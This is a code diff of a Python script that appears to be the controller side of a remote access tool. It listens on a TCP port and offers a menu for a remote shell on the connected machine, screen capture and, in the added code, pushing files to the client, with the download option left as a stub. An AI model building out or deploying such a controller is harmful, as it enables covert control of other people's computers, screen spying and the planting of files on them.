@@ -14,7 +14,7 @@ def print_menu():
 def establish_connection():
     global conn_to_client, server
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    server.bind(("0.0.0.0", 3000))
+    server.bind(("0.0.0.0", 3001))
     server.listen(0)
 
     print("Waiting on connections")
@@ -42,6 +42,8 @@ def send(data):
     data_size = f"{len(data):^{header_size}}"
     conn_to_client.send(data_size.encode())
     conn_to_client.sendall(data)
+    
+
 
 def open_shell():
     while True:
@@ -55,8 +57,32 @@ def open_shell():
         print(output.decode())
 
 
-def download_file():
-    pass
+def file_manager():
+    while True:
+        print("\n1.) Download File")
+        print("2.) Upload File")
+        print("3.) Back to Menu\n")
+        
+        choice = input("Enter Choice: ")
+        
+        if choice == "1":
+            #Download file
+            pass
+        elif choice == "2":
+            #Upload file
+            file_path = input("Enter File Path: ")
+            send(file_path.encode("UTF-8"))
+            
+            print("\nUploading File...", end="")
+            file = open(file_path, "rb")
+            send(file.read())
+            file.close()
+            
+            print("Done!\n")
+            
+        elif choice == "3":
+            break
+           
 
 def take_screen_shot():
     file_data = recv()
@@ -72,10 +98,13 @@ def main():
             send(b"1")
             open_shell()
         elif choice == "2":
-            send(b'2')
+            send(b"2")
             take_screen_shot()
-        elif choice == "6":
-            send(b'6')
+        elif choice == "4":
+            send(b"4")
+            file_manager()
+        elif choice == "5":
+            send(b"5")
             conn_to_client.shutdown(socket.SHUT_WR)
             conn_to_client.close()
             sys.exit()
